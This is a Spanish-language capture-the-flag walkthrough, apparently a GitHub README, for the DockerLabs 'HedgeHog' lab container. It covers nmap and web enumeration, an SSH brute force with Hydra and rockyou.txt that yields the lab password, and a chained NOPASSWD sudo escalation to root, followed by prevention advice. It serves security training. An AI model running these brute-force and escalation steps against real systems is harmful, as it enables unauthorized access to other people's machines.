# 🦔 HedgeHog - DockerLabs

![Dificultad](https://img.shields.io/badge/Dificultad-Muy%20F%C3%A1cil-green)
![SO](https://img.shields.io/badge/SO-Linux-blue)
![Técnicas](https://img.shields.io/badge/T%C3%A9cnicas-Hydra%20%7C%20Sudo%20Chain-orange)

## 📌 Resumen

Máquina de nivel **Muy Fácil** de [DockerLabs](https://dockerlabs.es/) que explota:

- **Enumeración web** con `w3m`/`curl` para descubrir un usuario.
- **Fuerza bruta SSH** con Hydra y `rockyou.txt`.
- **Escalada de privilegios en cadena** mediante permisos `sudo` mal configurados
  (`tails → sonic → root`).

| Fase | Técnica | Resultado |
|------|---------|-----------|
| Reconocimiento | `whatweb` + `curl -I` | Apache en Ubuntu |
| Enumeración web | `w3m` / Firefox | Usuario `tails` |
| Fuerza bruta | `hydra` + `rockyou.txt` | `tails:3117548331` |
| Acceso SSH | `ssh` | Shell como `tails` |
| Escalada | `sudo -l` → `sudo -u sonic` → `sudo -u root` | **root** ✅ |

---

## 🔍 Reconocimiento

### Escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2 -oN allPorts
```

**Resultado:**

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22     | SSH      | OpenSSH (Ubuntu) |
| 80     | HTTP     | Apache httpd 2.4.58 |

### Fingerprinting web

```bash
whatweb http://172.17.0.2
```

**Resultado:**

```
http://172.17.0.2 [200 OK] Apache[2.4.58], HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2]
```

### Cabeceras HTTP

```bash
curl -I http://172.17.0.2
```

**Resultado:**

```
HTTP/1.1 200 OK
Server: Apache/2.4.58 (Ubuntu)
Last-Modified: Tue, 29 Oct 2024 18:33:53 GMT
Content-Length: 6
Content-Type: text/html
```

---

## 🔎 Enumeración

### 1. Análisis de la web

La web devuelve solo **6 bytes** de HTML. Al verla con `w3m` (navegador de terminal):

```bash
w3m http://172.17.0.2
```

**Hallazgo:** aparece el **usuario `tails`** (probablemente en un mensaje o comentario).

Se confirma abriendo la web en **Firefox** (ventana privada para evitar caché).

### 2. Enumeración de directorios

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

**Resultado:** solo `index.html`. No hay directorios ocultos relevantes.

---

## 💥 Explotación

### 1. Fuerza bruta SSH

Primero se prueba una **lista corta** de contraseñas candidatas:

```bash
cat > pass.txt << 'EOF'
tails
tails123
password
123456
admin
letmein
toor
root
tails2024
EOF

hydra -l tails -P pass.txt ssh://172.17.0.2 -t 4
```

**Resultado:** ninguna válida.

Se pasa a `rockyou.txt` completo. Para optimizar, se invierte el diccionario (las contraseñas más recientes suelen estar al final):

```bash
tac /usr/share/wordlists/rockyou.txt > diccionario
cat diccionario | sed 's/ //g' > rockyou

hydra -l tails -P rockyou ssh://172.17.0.2 -t 4
```

**Credenciales obtenidas:**

```
tails:3117548331
```

### 2. Acceso SSH

```bash
ssh tails@172.17.0.2
# password: 3117548331
```

> ⚠️ Si aparece `WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!`:
> ```bash
> ssh-keygen -R 172.17.0.2
> ```

### 3. Enumeración post-explotación

```bash
id
whoami
cat /etc/passwd
ls -la /home
```

**Hallazgo:** existe otro usuario llamado **`sonic`**:

```
sonic:x:1001:1001::/home/sonic:/bin/bash
tails:x:1002:1002::/home/tails:/bin/bash
```

---

## 🚀 Escalada de privilegios

### 1. Enumeración de sudo (como tails)

```bash
sudo -l
```

**Salida:**

```
User tails may run the following commands on c379743ebf72:
    (sonic) NOPASSWD: ALL
```

`tails` puede ejecutar **cualquier comando** como `sonic` **sin contraseña**.

### 2. Cambio a sonic

```bash
sudo -u sonic -i
```

### 3. Enumeración de sudo (como sonic)

```bash
sudo -l
```

**Salida:**

```
User sonic may run the following commands on c379743ebf72:
    (ALL) NOPASSWD: ALL
```

`sonic` puede ejecutar **cualquier comando** como **cualquier usuario** (incluido root).

### 4. Cambio a root

```bash
sudo -u root -i
```

Comprobación:

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)
```

✅ **Máquina comprometida completamente.**

---

## 📸 Evidencia

<img width="312" height="49" alt="image" src="https://github.com/user-attachments/assets/e88c7eaa-128e-42b2-87e1-701e77b20ab9" />


---

## 🏁 Flags

Esta máquina **no incluye archivo de flag**. La evidencia es:

```bash
whoami
# root
```

> Se buscó `/root/flag.txt` y no existe. Tampoco hay flags en el sistema
> (`find / -name "*flag*"` solo devuelve archivos del kernel).

---

## 🧠 Lecciones aprendidas

1. **`w3m` es un navegador de terminal muy útil** para ver webs simples sin
   entorno gráfico. Menos ruido que `curl` y permite navegar.
2. **Invertir `rockyou.txt` con `tac`** puede acelerar la fuerza bruta: las
   contraseñas más recientes suelen estar al final del diccionario.
3. **`sudo -l` es lo primero** tras obtener shell. Y si hay más usuarios,
   **enumerar cada uno**.
4. **Escalada en cadena**: si `A` puede ser `B` y `B` puede ser `root`, la
   escalada es trivial. Buscar estas cadenas es clave en pentesting.
5. **`sudo -u usuario -i`** es la forma limpia de cambiar de usuario con sudo.
6. **Los espacios importan**: `ls -la/home` falla, `ls -la /home` funciona.
   Un clásico que todos cometemos.

---

## 🛡️ ¿Cómo se previene?

1. **No usar `NOPASSWD: ALL`** en sudo. Si un usuario necesita ejecutar algo
   como otro, restringir a **comandos específicos**.
2. **Evitar cadenas de sudo**: si `tails` puede ser `sonic` y `sonic` puede
   ser root, es equivalente a que `tails` sea root. Auditar estas cadenas.
3. **Aplicar el principio de mínimo privilegio.**
4. **Usar autenticación por clave SSH** en lugar de contraseñas.
5. **Contraseñas fuertes y únicas** para cada usuario.

---

## 🛠️ Herramientas utilizadas

- `nmap`
- `whatweb`
- `curl`
- `w3m`
- `gobuster`
- `hydra`
- SSH

---

## 📚 Referencias

- [DockerLabs](https://dockerlabs.es/)
- [Hydra](https://github.com/vanhauser-thc/thc-hydra)
- [w3m](https://w3m.sourceforge.net/)
- [GTFObins - sudo](https://gtfobins.github.io/gtfobins/sudo/)

---

**Autor:** [Murmur](https://github.com/murmur403)
**Fecha:** 2026-09-30
